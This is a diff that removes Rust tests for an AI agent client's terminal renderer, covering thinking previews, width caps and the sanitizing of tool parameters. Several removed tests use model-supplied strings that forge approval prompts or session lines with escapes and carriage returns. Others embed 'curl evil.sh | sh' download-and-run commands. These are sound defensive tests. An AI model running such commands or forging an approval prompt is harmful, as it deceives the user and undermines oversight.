-            // sanitizing as nothing at all.
-            (
-                "zero-width run",
-                format!("{}the actual reasoning", "\u{200b}".repeat(2000)),
-                80,
-            ),
-            // Thirty-three source characters per rendered glyph.
-            (
-                "entities",
-                format!(
-                    "{} and then the conclusion",
-                    "&CounterClockwiseContourIntegral; ".repeat(200)
-                ),
-                80,
-            ),
-            // A wide terminal, where the row itself outruns the lookahead.
-            (
-                "wide row",
-                format!("{}THE END", "**a** ".repeat(2000)),
-                2000,
-            ),
-        ] {
-            let shown = super::thinking_preview_text(&reasoning, width);
-            assert!(
-                shown.ends_with(super::TRUNCATION_MARKER),
-                "{name}: a cut block read as the whole of it: {shown:?}"
-            );
-        }
-    }
-
-    /// The marker says exactly what happened: present when the row could not hold the block, and
-    /// absent when it could.
-    ///
-    /// Both halves matter, and the false-positive half is the one that slipped through. Markers
-    /// count toward the source's length and not the rendered text's, so budgeting the collapse at
-    /// the row's own width gave two different answers to "was anything dropped" -- and a block that
-    /// fit was labeled cut, which is a false statement about the model's output rather than a
-    /// missing one.
-    #[test]
-    fn a_preview_says_it_was_cut_exactly_when_it_was() {
-        let budget = 42 - super::display_width(super::THINKING_PREFIX);
-
-        let whole = super::thinking_preview_text("**abcdefghij** **klmnopqrst** uvwxy", 42);
-        assert_eq!(
-            whole, "abcdefghij klmnopqrst uvwxy",
-            "a block the row can hold must not claim a cut",
-        );
-
-        let cut = super::thinking_preview_text(
-            "**Planning the work** and then a great deal more text that follows on and on",
-            42,
-        );
-        assert!(
-            cut.ends_with(super::TRUNCATION_MARKER),
-            "the preview dropped the rest of the block silently: {cut:?}"
-        );
-        assert!(super::display_width(&cut) <= budget, "{cut:?}");
-    }
-
-    /// An emphasis span wider than the row still resolves to styling.
-    ///
-    /// The cut is made on the markdown source, and a span whose closing `**` falls past it never
-    /// closes -- pulldown-cmark then renders the opener as text, which is the marker this preview
-    /// exists to stop showing. Narrow widths are where it bites: `display.max_width = 40` leaves a
-    /// 28-column row, so an ordinary summary header outruns it.
-    #[test]
-    fn a_preview_styles_emphasis_that_outruns_the_row() {
-        let runs = super::thinking_preview_runs(
-            "**Weighing the trade-offs between two candidate approaches** then more.",
-            40,
-        );
-        let shown: String = runs.iter().map(|run| run.text.as_str()).collect();
-        assert!(!shown.contains("**"), "the span never closed: {shown:?}");
-        assert!(
-            runs.first().is_some_and(|run| run.bold),
-            "and its emphasis reached the row: {:?}",
-            runs.first().map(|run| &run.text)
-        );
-    }
-
-    /// The cut is made on the plain text and the styling put back afterwards, so it can never land
-    /// inside an escape sequence. The marker the cut leaves is meka's own word for "there was
-    /// more", so it carries none of the model's styling out with it.
-    #[test]
-    fn a_truncated_thinking_preview_cuts_text_rather_than_escapes() {
-        // `bold` without the trailing space: `** ` is not a CommonMark closer, so a span built from
-        // `"bold ".repeat(n)` never closes and the assertion about the marker's styling below has
-        // no bold run to be about.
-        let reasoning = format!("**{}bold** and then some more prose", "bold ".repeat(20));
-        let runs = super::thinking_preview_runs(&reasoning, 40);
-        let shown: String = runs.iter().map(|run| run.text.as_str()).collect();
-        assert!(
-            super::display_width(&shown) <= 40 - super::display_width(super::THINKING_PREFIX),
-            "{shown:?}"
-        );
-        assert!(shown.ends_with(super::TRUNCATION_MARKER), "{shown:?}");
-        // Without this the assertion below is about a case the input cannot produce: an unclosed
-        // span yields no bold run, and a marker cannot inherit emphasis that was never there.
-        assert!(
-            runs.iter().any(|run| run.bold),
-            "the cut has to land inside a styled run for the marker's styling to be in question",
-        );
-        let marker = runs.last().expect("a run");
-        assert!(
-            marker.text.ends_with(super::TRUNCATION_MARKER) && !marker.bold,
-            "the marker wears the model's emphasis: {:?}",
-            marker.text
-        );
-    }
-
-    /// `show_content = true` prints the block whole, and replayed history always does, so that
-    /// branch needs the same stripping. Keeping its line structure is the one difference.
-    #[test]
-    fn a_full_thinking_block_is_stripped_but_keeps_its_lines() {
-        let body = thinking_rows("one\n\u{1b}[2Jtwo\nthree", RenderMode::Raw, TEST_WIDTH);
-        assert_eq!(body, "Thinking... one\n  two\n  three\n");
-    }
-
-    /// The label goes out with the first delta, ahead of the text every mode holds back, so the
-    /// row the indicator gives up is never blank.
-    #[test]
-    fn the_label_is_spent_on_the_first_delta_not_the_first_settled_row() {
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let mut renderer = super::StreamingRenderer::for_thinking(mode).capturing(TEST_WIDTH);
-            renderer
-                .push_delta("partial")
-                .expect("a captured write cannot fail");
-            assert_eq!(
-                strip_ansi_escapes(renderer.captured()),
-                "Thinking... ",
-                "{mode:?}: the label waits for the paragraph"
-            );
-            renderer
-                .push_delta(" rest\n\n")
-                .expect("a captured write cannot fail");
-            renderer.finish().expect("a captured write cannot fail");
-            assert_eq!(
-                strip_ansi_escapes(renderer.captured()),
-                "Thinking... partial rest\n",
-                "{mode:?}"
-            );
-        }
-    }
-
-    /// A block another writer interrupts resumes behind its label, whether the interruption found
-    /// the label's row open with the first paragraph still held, or fell between two paragraphs.
-    /// The label goes out at the next delta, as it does at the first, and the blank held behind
-    /// the paragraph before the interruption is not released in front of it. The answer, which
-    /// wears no label, keeps that blank: its paragraphs stay spaced as if nothing had cut in.
-    #[test]
-    fn an_interrupted_block_resumes_behind_its_label() {
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let mut renderer = super::StreamingRenderer::new(mode).capturing(TEST_WIDTH);
-            renderer
-                .push_delta("one\n\n")
-                .expect("a captured write cannot fail");
-            renderer.interrupt().expect("a captured write cannot fail");
-            renderer
-                .push_delta("two\n\n")
-                .expect("a captured write cannot fail");
-            renderer.finish().expect("a captured write cannot fail");
-            assert_eq!(
-                strip_ansi_escapes(renderer.captured()),
-                "one\n\ntwo\n",
-                "{mode:?}: the answer keeps its paragraph gap across the interruption"
-            );
-        }
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let mut renderer = super::StreamingRenderer::for_thinking(mode).capturing(TEST_WIDTH);
-            renderer
-                .push_delta("partial")
-                .expect("a captured write cannot fail");
-            renderer.interrupt().expect("a captured write cannot fail");
-            renderer
-                .push_delta(" rest\n\n")
-                .expect("a captured write cannot fail");
-            assert_eq!(
-                strip_ansi_escapes(renderer.captured()),
-                "Thinking... \nThinking... partial rest\n",
-                "{mode:?}: the held text resumes behind a second label"
-            );
-
-            renderer.interrupt().expect("a captured write cannot fail");
-            renderer
-                .push_delta("two")
-                .expect("a captured write cannot fail");
-            assert_eq!(
-                strip_ansi_escapes(renderer.captured()),
-                "Thinking... \nThinking... partial rest\nThinking... ",
-                "{mode:?}: the label goes out at the first delta after the interruption"
-            );
-            renderer
-                .push_delta("\n\n")
-                .expect("a captured write cannot fail");
-            renderer.finish().expect("a captured write cannot fail");
-            assert_eq!(
-                strip_ansi_escapes(renderer.captured()),
-                "Thinking... \nThinking... partial rest\nThinking... two\n",
-                "{mode:?}"
-            );
-        }
-    }
-
-    /// A paragraph break between two chunks survives, having been held across the gap.
-    ///
-    /// The blank row is written with the chunk *before* it and belongs to the one *after*, so it is
-    /// held until something follows -- and if it is only ever dropped, two paragraphs streamed a
-    /// chunk apart run together. Held and released are separate branches, and the tests that pin
-    /// the block's *end* only ever exercise the dropping one.
-    #[test]
-    fn a_paragraph_break_between_two_chunks_survives() {
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let mut renderer = super::StreamingRenderer::new(mode).capturing(80);
-            renderer
-                .push_delta("para one.\n\n")
-                .expect("a captured write cannot fail");
-            renderer
-                .push_delta("para two.\n\n")
-                .expect("a captured write cannot fail");
-            renderer.finish().expect("a captured write cannot fail");
-            let shown = super::CSI_PATTERN
-                .replace_all(renderer.captured(), "")
-                .to_string();
-            assert_eq!(
-                shown, "para one.\n\npara two.\n",
-                "the break between two chunks was lost under {mode:?}"
-            );
-        }
-    }
-
-    /// Reasoning is painted by the dim skin, not the answer's.
-    ///
-    /// Both render the same markdown, so every assertion about *structure* passes either way: what
-    /// separates them is that one resolves every element to one gray and the other to the theme's
-    /// colors. Nothing else here would notice the two being swapped.
-    #[test]
-    fn reasoning_is_painted_by_the_dim_skin() {
-        force_colors();
-        let mut renderer =
-            super::StreamingRenderer::for_thinking(RenderMode::Termimad).capturing(80);
-        renderer
-            .push_delta("**A header** and some prose.\n\n")
-            .expect("a captured write cannot fail");
-        renderer.finish().expect("a captured write cannot fail");
-        let raw = renderer.captured();
-        assert!(raw.contains("38;5;8"), "reasoning is not gray: {raw:?}");
-        assert!(
-            raw.contains("\u{1b}[1m"),
-            "the header lost its emphasis: {raw:?}"
-        );
-        // The answer's skin resolves elements against the syntect theme, which is 24-bit.
-        assert!(
-            !raw.contains("38;2;"),
-            "reasoning was painted with the answer's palette: {raw:?}"
-        );
-    }
-
-    /// A completed row is terminated before the write returns, not held.
-    ///
-    /// `crate::console::RowState` tracks who has parked the cursor mid-row -- the thinking
-    /// indicator and the MCP progress line -- so that anything printing next settles that row
-    /// first. A renderer holding a row's terminator back is a third such writer the state machine
-    /// does not model, and it reports `Empty` throughout: a mid-turn `tracing` line would be
-    /// appended to the model's last row, and an MCP progress line's carriage return would overwrite
-    /// it. Only *blank* rows may be held, because whether they separate or trail is unknowable
-    /// until something follows.
-    ///
-    /// Asserted on the emitted bytes and nowhere else. The console's `RowState` and the renderer's
-    /// own bookkeeping are both *claims*; a test comparing the two agrees with itself while the
-    /// cursor sits mid-line, which is exactly the state this guards against.
-    #[test]
-    fn a_finished_row_is_terminated_before_the_write_returns() {
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let mut renderer = super::StreamingRenderer::new(mode).capturing(80);
-            renderer
-                .push_delta("line one\n\nline two\n\n")
-                .expect("a captured write cannot fail");
-            // A fenced block left unterminated: its rows are highlighted one at a time, so the
-            // trailing blanks arrive with escapes between them. Reached by any answer cut off
-            // inside a fence -- a `max_tokens` stop, an interrupt.
-            let mut fence = super::StreamingRenderer::new(mode).capturing(80);
-            fence
-                .push_delta("```rust\nfn main() {}\n\n")
-                .expect("a captured write cannot fail");
-            fence.finish().expect("a captured write cannot fail");
-            let shown = super::CSI_PATTERN
-                .replace_all(fence.captured(), "")
-                .to_string();
-            assert!(
-                !shown.ends_with("\n\n"),
-                "an unterminated fence ended on a blank row under {mode:?}: {shown:?}"
-            );
-
-            // Also after the block closes: the syntect path writes a highlighted line and its
-            // newline in two calls, so a terminator arriving with an empty body is the shape that
-            // was held as a blank row and then dropped, ending the answer without a newline.
-            let mut whole = super::StreamingRenderer::new(mode).capturing(80);
-            whole
-                .push_delta("the answer")
-                .expect("a captured write cannot fail");
-            whole.finish().expect("a captured write cannot fail");
-            assert!(
-                whole.captured().ends_with('\n'),
-                "the block ended without terminating its last row under {:?}: {:?}",
-                mode,
-                whole.captured()
-            );
-            assert!(
-                renderer.captured().ends_with('\n'),
-                "the cursor was left parked mid-row under {:?}: {:?}",
-                mode,
-                renderer.captured()
-            );
-            // And the blank rows behind it are still in question, so they have not gone out yet.
-            assert!(
-                !renderer.captured().ends_with("\n\n"),
-                "a trailing blank row escaped before anything followed it under {:?}: {:?}",
-                mode,
-                renderer.captured()
-            );
-        }
-    }
-
-    /// Separating one block from the next belongs to `crate::console`, so a renderer that ends its
-    /// own block with a blank row makes that gap twice as tall.
-    ///
-    /// Reachable from ordinary model output: a chunk cut at a paragraph break carries the break as
-    /// a trailing blank line, which is a separator from the next chunk right up until no next chunk
-    /// comes. Both streamed kinds go through the same writer, so both are pinned here.
-    #[test]
-    fn a_block_does_not_end_on_a_blank_row() {
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let thinking = thinking_rows("one\n\ntwo\n\n", mode, 80);
-            assert!(
-                thinking.ends_with("two\n"),
-                "thinking under {mode:?} ended on a blank row: {thinking:?}"
-            );
-
-            let mut renderer = super::StreamingRenderer::new(mode).capturing(80);
-            renderer
-                .push_delta("one\n\ntwo\n\n")
-                .expect("a captured write cannot fail");
-            renderer.finish().expect("a captured write cannot fail");
-            let answer = super::CSI_PATTERN
-                .replace_all(renderer.captured(), "")
-                .to_string();
-            assert!(
-                answer.ends_with("two\n"),
-                "the answer under {mode:?} ended on a blank row: {answer:?}"
-            );
-        }
-    }
-
-    /// A blank line inside a block is a blank row, not an indent nobody can see. The indent is
-    /// spent on rows that carry text, so a paragraph break leaves no trailing whitespace behind.
-    #[test]
-    fn a_blank_line_in_a_thinking_block_wears_no_indent() {
-        let body = thinking_rows("one\n\ntwo", RenderMode::Raw, TEST_WIDTH);
-        assert_eq!(body, "Thinking... one\n\n  two\n");
-    }
-
-    /// Stripping escapes is not the whole of it. `Thinking... ` prefixes only the first row, so an
-    /// unindented second row of reasoning lands at column zero in the same gray as
-    /// `render_session_id` and reproduces it byte-for-byte, with no escape at all.
-    ///
-    /// Asserted in both modes: the indent is applied where bytes leave, so it must not depend on
-    /// which renderer produced them.
-    #[test]
-    fn a_full_thinking_block_cannot_forge_a_line_of_meka_chrome() {
-        let forged = "Let me check.\nResuming session: 550e8400-e29b-41d4-a716-446655440000";
-        let chrome = "Resuming session: 550e8400-e29b-41d4-a716-446655440000";
-        for mode in [RenderMode::Raw, RenderMode::Termimad] {
-            let body = thinking_rows(forged, mode, TEST_WIDTH);
-            assert!(
-                body.lines()
-                    .skip(1)
-                    .all(|line| line.is_empty() || line.starts_with(super::TOOL_PARAM_INDENT)),
-                "{body:?} under {mode:?}"
-            );
-            assert!(
-                !body.lines().any(|line| line == chrome),
-                "{body:?} under {mode:?}"
-            );
-        }
-    }
-
-    /// `unicode_width` measures a soft hyphen as zero columns; a terminal following `wcwidth` draws
-    /// one. Left in, a run of them passes any column budget unmeasured and wraps for as many rows
-    /// as the model likes, which defeats every cap at once.
-    #[test]
-    fn zero_measured_format_characters_cannot_evade_the_width_cap() {
-        for probe in ['\u{00ad}', '\u{200b}', '\u{202e}', '\u{feff}'] {
-            let rendered = params(serde_json::json!({"q": probe.to_string().repeat(2000)}));
-            assert!(!rendered.contains(probe), "{probe:?} survived");
-            assert_eq!(rendered, "  q: (no printable text)", "{probe:?}");
-        }
-    }
-
-    /// A carriage return returns the cursor to column zero without ending the row, so a kept one
-    /// wipes the `Thinking... ` label and leaves gray text where `render_session_id` puts its own.
-    /// It needs no escape sequence at all, which is why [`sanitize_stream_text`] drops it.
-    #[test]
-    fn a_full_thinking_block_cannot_repaint_its_own_label() {
-        let forged = "thought\rResuming session: 4f1e0c2a-0000-4000-8000-deadbeefcafe";
-        let body = thinking_rows(forged, RenderMode::Raw, TEST_WIDTH);
-        assert!(!body.contains('\r'), "{body:?}");
-        assert!(body.starts_with(super::THINKING_PREFIX), "{body:?}");
-    }
-
-    /// Replayed history has no tool schemas, so it passes no summary. Showing a bare
-    /// `[tool file_read]` there made a replay strictly less informative than the live line it is
-    /// replaying, for tools whose primary parameter needs no schema.
-    #[test]
-    fn a_replayed_builtin_recovers_its_argument_without_a_schema() {
-        assert_eq!(
-            tool_indicator_line(
-                "file_read",
-                &serde_json::json!({"path": "/etc/hosts"}),
-                None,
-                TEST_WIDTH,
-            ),
-            "[tool file_read(`/etc/hosts`)]"
-        );
-    }
-
-    /// The live path resolved against the schema already, so its answer wins even where the
-    /// schema-less fallback would have found something different.
-    #[test]
-    fn a_supplied_summary_is_preferred_over_the_fallback() {
-        assert_eq!(
-            tool_indicator_line(
-                "file_read",
-                &serde_json::json!({"path": "/etc/hosts"}),
-                Some("/resolved/by/the/agent"),
-                TEST_WIDTH,
-            ),
-            "[tool file_read(`/resolved/by/the/agent`)]"
-        );
-    }
-
-    /// The reported defect, pinned by name. `crate::tools`'
-    /// `every_tool_with_arguments_can_show_a_primary_param` is what generalizes it to
-    /// every built-in; this is the case a reader recognizes.
-    #[test]
-    fn a_replayed_cancellation_says_what_it_canceled() {
-        assert_eq!(
-            tool_indicator_line(
-                "schedule_cancel",
-                &serde_json::json!({"id": "7f3a1c22"}),
-                None,
-                TEST_WIDTH,
-            ),
-            "[tool schedule_cancel(`7f3a1c22`)]"
-        );
-    }
-
-    /// A list-valued primary parameter is joined, not dropped. Reading only `as_str` returned
-    /// `None` here, which cost the live line nothing (the schema fallback coerced the same value)
-    /// and cost the replayed one its argument.
-    #[test]
-    fn a_list_valued_primary_param_survives_replay() {
-        assert_eq!(
-            tool_indicator_line(
-                "memory_search",
-                &serde_json::json!({"queries": ["window size", "context window"]}),
-                None,
-                TEST_WIDTH,
-            ),
-            "[tool memory_search(`window size, context window`)]"
-        );
-    }
-
-    /// An MCP tool's primary parameter is only knowable from its schema, which history does not
-    /// have. Bare is the honest rendering; inventing one from the first key would be a guess.
-    #[test]
-    fn a_replayed_mcp_tool_stays_bare() {
-        assert_eq!(
-            tool_indicator_line(
-                "mcp__ida__decompile",
-                &serde_json::json!({"address": "0x1400"}),
-                None,
-                TEST_WIDTH,
-            ),
-            "[tool mcp__ida__decompile]"
-        );
+        assert_eq!(collapse_to_line("\n\n   \n"), "");
     }
 
     /// Wide enough that a test asserting exact output is not accidentally testing truncation.
     const TEST_WIDTH: usize = 200;
-
-    fn params(input: serde_json::Value) -> String {
-        super::render_tool_params(&input, TEST_WIDTH, super::BlockLimits::indicator()).join("\n")
-    }
-
-    #[test]
-    fn full_params_put_scalars_on_the_key_line() {
-        assert_eq!(
-            params(serde_json::json!({"command": "cargo test --bin meka", "timeout": 300})),
-            "  command: cargo test --bin meka\n  timeout: 300"
-        );
-    }
-
-    /// The case the whole format exists for. As JSON this is one line of `\\n` escapes, which is
-    /// unreadable for exactly the two tools whose arguments most need reading.
-    #[test]
-    fn a_multi_line_string_becomes_an_indented_block_under_a_bare_key() {
-        assert_eq!(
-            params(serde_json::json!({
-                "path": "src/render.rs",
-                "old_string": "let first = lines.next();\nlet cut = truncate(first);",
-            })),
-            "  path: src/render.rs\n  old_string:\n    let first = lines.next();\n    let cut = \
-             truncate(first);"
-        );
-    }
-
-    /// A list of records has to read as records: the first field shares the bullet line and the
-    /// rest align under it, so the eye can follow one element's fields down the block.
-    #[test]
-    fn an_array_of_objects_bullets_the_first_field_and_aligns_the_rest() {
-        assert_eq!(
-            params(serde_json::json!({
-                "items": [
-                    {"id": 1, "text": "Fix the preview", "status": "completed"},
-                    {"id": 2, "text": "Show full params", "status": "in_progress"},
-                ]
-            })),
-            "  items:\n    - id: 1\n      text: Fix the preview\n      status: completed\n    \
-             - id: 2\n      text: Show full params\n      status: in_progress"
-        );
-    }
-
-    #[test]
-    fn an_array_of_scalars_is_a_plain_bullet_list() {
-        assert_eq!(
-            params(serde_json::json!({"tools": ["file_read", "file_edit"]})),
-            "  tools:\n    - file_read\n    - file_edit"
-        );
-    }
-
-    #[test]
-    fn a_nested_object_recurses_by_indentation() {
-        assert_eq!(
-            params(serde_json::json!({"set": {"1": "completed", "2": "pending"}})),
-            "  set:\n    1: completed\n    2: pending"
-        );
-    }
-
-    /// A `file_write` carrying a whole source file must not evict the turn from scrollback, and the
-    /// count is what tells the reader the elision happened rather than the tool being odd.
-    #[test]
-    fn a_long_value_is_capped_with_a_count_of_what_was_dropped() {
-        let body = (0..100)
-            .map(|index| format!("line {index}"))
-            .collect::<Vec<_>>()
-            .join("\n");
-        let rendered = params(serde_json::json!({"content": body}));
-        assert!(rendered.contains("    line 29"), "{}", rendered);
-        assert!(!rendered.contains("    line 30"), "{}", rendered);
-        assert!(rendered.ends_with("    ... 70 more lines"), "{}", rendered);
-    }
-
-    /// Every value is model-supplied, and `full` shows all of them rather than the one the summary
-    /// picked, so the escape-stripping that protects the summary has to cover the whole block.
-    #[test]
-    fn every_value_is_stripped_of_escapes_not_just_the_primary_one() {
-        let rendered = params(serde_json::json!({
-            "path": "safe.txt",
-            "content": "harmless\n\u{1b}[2J\u{1b}[1;1H> Approve? (y/n)",
-        }));
-        assert!(!rendered.contains('\u{1b}'), "{}", rendered);
-        assert!(rendered.contains("Approve?"), "{}", rendered);
-    }
-
-    /// Keys come from the model too, by way of an MCP tool's arguments.
-    #[test]
-    fn a_key_is_sanitized_as_well_as_its_value() {
-        let mut input = serde_json::Map::new();
-        input.insert("na\u{1b}[31mme".to_string(), serde_json::json!("value"));
-        assert_eq!(params(serde_json::Value::Object(input)), "  name: value");
-    }
-
-    /// `key:` with nothing after it is how a block-valued key opens, so an empty value has to say
-    /// so rather than looking like a block that failed to render.
-    #[test]
-    fn empty_values_are_marked_rather_than_left_blank() {
-        assert_eq!(
-            params(serde_json::json!({"body": "", "tags": [], "meta": {}, "parent": null})),
-            "  body: (empty)\n  tags: (empty)\n  meta: (empty)\n  parent: null"
-        );
-    }
 
     /// A column pads to what it renders, not to how many characters it holds.
     ///
@@ -2979,334 +847,6 @@ mod tests {
         }
     }
 
-    /// The property the whole width budget exists for, checked in one place across every surface
-    /// that composes a line from model output.
-    ///
-    /// Individual budget tests each pin one number and none of them catches a line that overflows
-    /// because two capped parts were concatenated, or because chrome was added after the cut, so
-    /// this states the invariant rather than an instance of it.
-    #[test]
-    fn no_composed_line_ever_exceeds_the_width_it_was_given() {
-        use crate::checklist::{ChecklistItem, ChecklistStatus};
-
-        let nasty = [
-            "plain",
-            &"x".repeat(500),
-            &"漢".repeat(300),
-            &"😀".repeat(200),
-            "tab\tseparated\tvalues",
-            "line one\nline two\nline three",
-            // A long *continuation* line: the first-line budget and the rest-of-block budget
-            // differ, and only a line past the width tells them apart.
-            "short first line\nand then a second line long enough to need more than one row of any \
-             terminal meka is willing to compose for, twice over, so the continuation budget is the \
-             one under test",
-            "carriage\rreturn",
-            "\u{1b}[2J\u{1b}[1;1Hescape",
-            "\u{00ad}\u{200b}\u{202e}\u{feff}",
-            "",
-            "   ",
-            // A fenced block and a table reach the terminal by routes a paragraph does not: the
-            // fence is pulled out of termimad before it can lay it out, and table rows are padded
-            // to the widest cell. Both were unbounded while the paragraph path was not, which is
-            // the shape this corpus exists to catch and did not.
-            "prose\n\n```\nminified\u{20}line \
-             wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\n```\n",
-            "| a | b |\n| --- | --- |\n| c | yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\
-             yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy |\n",
-            // An *indented* code block reaches termimad rather than being pulled out as a fence
-            // does, so it is laid out by a different path again -- and one that pads.
-            "prose\n\n    an indented code line long enough to outrun any terminal meka composes \
-             for, twice over at least\n",
-            // The shapes markdown reinterprets across lines, each of which changes what the row
-            // above it is: a setext underline, a rule, a quote, a nested and an ordered list.
-            "Setext heading\n===\n\nbody\n\n---\n\n> a quoted line that keeps going for a while\n\n\
-             1. ordered\n2. items\n   - nested\n     - deeper\n",
-            // Wide characters inside a padded cell: the pad is counted in columns, the content in
-            // clusters, and a table is where the two most easily disagree.
-            "| 漢字 | 😀😀 |\n| --- | --- |\n| 漢字漢字 | tail |\n",
-        ];
-        let long_key = "k".repeat(300);
-        // Deep nesting and variation selectors are the two shapes that break the invariant while a
-        // test feeding `nasty` only to the thinking and checklist assertions, at three levels,
-        // stays green.
-        let mut deep = serde_json::json!("SECRET_PAYLOAD");
-        for level in 0..25 {
-            deep = serde_json::json!({ format!("k{}", level): deep });
-        }
-        // Arrays nest through `push_item`, a separate recursion from `push_param`'s, so nesting
-        // only objects leaves half the depth handling untested. Both innermost shapes
-        // matter: a record at the bottom takes the arm that hoists a field onto the bullet
-        // line, a bare string does not.
-        let mut deep_array = serde_json::json!("SECRET_PAYLOAD");
-        let mut deep_records = serde_json::json!({"k": "SECRET_PAYLOAD"});
-        for _ in 0..25 {
-            deep_array = serde_json::json!([deep_array]);
-            deep_records = serde_json::json!([deep_records]);
-        }
-        // Enough arguments to reach the `... N more arguments` line, which no other input here does
-        // -- and which was the one line in the block composed without a width budget.
-        let many_arguments = serde_json::Value::Object(
-            (0..300)
-                .map(|index| (format!("o{index:03}"), serde_json::json!("v")))
-                .collect(),
-        );
-        let inputs = [
-            deep,
-            many_arguments,
-            deep_array.clone(),
-            deep_records.clone(),
-            serde_json::json!({ "nest": deep_array }),
-            serde_json::json!({ "nest": deep_records }),
-            serde_json::json!({"vs": "1\u{fe0f}".repeat(300)}),
-            serde_json::json!({"keycap": "1\u{fe0f}\u{20e3}".repeat(200)}),
-            serde_json::json!({"invisible": "\u{2800}\u{fe0f}".repeat(200)}),
-            serde_json::json!({"tabbed": "\tif ok {\n\t\treturn VeryLongConstantWithoutSpaces\n\t}"}),
-            serde_json::json!({"nasty": nasty.map(serde_json::Value::from).to_vec()}),
-            serde_json::json!({}),
-            serde_json::json!({"path": "src/render.rs", "content": "a\nb\nc"}),
-            serde_json::json!({&long_key: "value", "second": "another"}),
-            serde_json::json!({"items": (0..200).map(|index| serde_json::json!({"id": index, "text": "漢".repeat(120)})).collect::<Vec<_>>()}),
-            serde_json::json!(["bare", "array", "\u{1b}[2Jelement"]),
-            serde_json::json!("a bare string input"),
-            serde_json::json!({"nested": {"deep": {"deeper": "漢".repeat(400)}}}),
-        ];
-        let names = [
-            "file_read",
-            "mcp__server__a_rather_long_tool_name",
-            &"n".repeat(400),
-        ];
-
-        // Down to the floor `output_width` enforces, because that floor is the whole reason this
-        // assertion needs no exception: below it the fixed chrome alone outruns the width.
-        for width in [MIN_OUTPUT_WIDTH, 21, 25, 40, 80, 100, 200] {
-            for name in names {
-                for input in &inputs {
-                    for style in [ToolParams::Off, ToolParams::Summary, ToolParams::Full] {
-                        let (header, block) =
-                            super::tool_indicator_parts(name, input, None, style, width);
-                        let mut lines = vec![header];
-                        lines.extend(block);
-                        for line in lines {
-                            assert!(
-                                super::display_width(&line) <= width,
-                                "indicator at width {}: {} columns in {:?}",
-                                width,
-                                super::display_width(&line),
-                                line
-                            );
-                        }
-                    }
-                }
-            }
-            for input in &inputs {
-                // The whole block wraps rather than cutting, which is the case where a row can
-                // exceed the width if the wrap arithmetic is wrong, and where a continuation row
-                // could land at column zero.
-                for line in super::render_whole_params(input, width) {
-                    assert!(
-                        super::display_width(&line) <= width,
-                        "whole block at width {}: {} columns in {:?}",
-                        width,
-                        super::display_width(&line),
-                        line
-                    );
-                    assert!(
-                        line.starts_with(super::TOOL_PARAM_INDENT),
-                        "whole block row at column zero: {line:?}"
-                    );
-                }
-            }
-            for text in nasty {
-                assert!(
-                    super::display_width(super::THINKING_PREFIX)
-                        + super::display_width(&super::thinking_preview_text(text, width))
-                        <= width,
-                    "thinking preview at width {width}: {text:?}"
-                );
-                // Every row already carries its own label or indent, so each is measured whole.
-                //
-                // Measured trimmed, for one exception worth naming rather than leaving uncovered:
-                // termimad does not reflow a code block, it lays it out at its widest line and pads
-                // every row to match. On a terminal narrower than that block, the padding runs past
-                // the row. The *text* still wraps to the budget -- verified against an indented
-                // block whose content is a forged `Resuming session:` line, which comes back
-                // broken across rows at the indent -- so what overruns is whitespace, and what the
-                // boundary exists to stop cannot ride it out to column zero.
-                for mode in [RenderMode::Raw, RenderMode::Termimad] {
-                    for line in thinking_rows(text, mode, width).lines() {
-                        let printed = line.trim_end();
-                        assert!(
-                            super::display_width(printed) <= width,
-                            "thinking at width {} under {:?}: {} columns in {:?}",
-                            width,
-                            mode,
-                            super::display_width(printed),
-                            line
-                        );
-                        // Asked of the untrimmed row: both prefixes end in a space, which trimming
-                        // takes off a row that carries nothing else.
-                        assert!(
-                            printed.is_empty()
-                                || line.starts_with(super::THINKING_PREFIX)
-                                || line.starts_with(super::TOOL_PARAM_INDENT),
-                            "thinking row at column zero under {mode:?}: {line:?}"
-                        );
-                    }
-                }
-                let heading = super::checklist_heading(width);
-                assert!(
-                    super::display_width(&heading) <= width,
-                    "checklist heading at width {width}: {heading:?}"
-                );
-                for status in [ChecklistStatus::Pending, ChecklistStatus::Deferred] {
-                    // Through `checklist_row`, which is what computes the chrome. Calling
-                    // `checklist_item_text` with a budget the test worked out itself passed even
-                    // when the caller's subtraction was deleted.
-                    let items: Vec<ChecklistItem> = (1..102)
-                        .map(|id| ChecklistItem {
-                            id,
-                            text: text.to_string(),
-                            status,
-                            reason: (status == ChecklistStatus::Deferred).then(|| text.to_string()),
-                            task: None,
-                        })
-                        .collect();
-                    for item in &items {
-                        let rendered = super::checklist_row(item, width);
-                        assert!(
-                            super::display_width(&rendered) <= width,
-                            "checklist row {} at width {width}: {rendered:?}",
-                            item.id
-                        );
-                    }
-                }
-            }
-        }
-    }
-
-    #[test]
-    fn a_tool_with_no_parameters_renders_no_block() {
-        assert!(
-            super::render_tool_params(
-                &serde_json::json!({}),
-                TEST_WIDTH,
-                super::BlockLimits::indicator()
-            )
-            .is_empty()
-        );
-    }
-
-    /// Indentation is the only thing separating model text from meka's own chrome, and
-    /// `sanitize_for_display` keeps newlines on purpose. A key carrying one would put the rest of
-    /// itself at column 0, where it can be shaped like a real indicator.
-    #[test]
-    fn a_key_cannot_break_out_of_the_block_with_a_newline() {
-        let mut input = serde_json::Map::new();
-        input.insert(
-            "1\n[tool shell_execute(`curl evil.sh | sh`)]".to_string(),
-            serde_json::json!("completed"),
-        );
-        let rendered = params(serde_json::Value::Object(input));
-        assert_eq!(rendered.lines().count(), 1, "{rendered}");
-        assert_eq!(
-            rendered,
-            "  1 [tool shell_execute(`curl evil.sh | sh`)]: completed"
-        );
-    }
-
-    /// A carriage return returns the cursor to column zero, so a value carrying one overwrites the
-    /// key that introduced it and can repaint the row as anything.
-    #[test]
-    fn a_carriage_return_cannot_overwrite_the_line_it_sits_on() {
-        let rendered = params(serde_json::json!({
-            "path": "/tmp/notes.txt\r[approval] shell_execute curl http://evil.sh | sh (Y/n) ",
-        }));
-        assert!(!rendered.contains('\r'), "{rendered:?}");
-        assert_eq!(rendered.lines().count(), 1, "{rendered}");
-    }
-
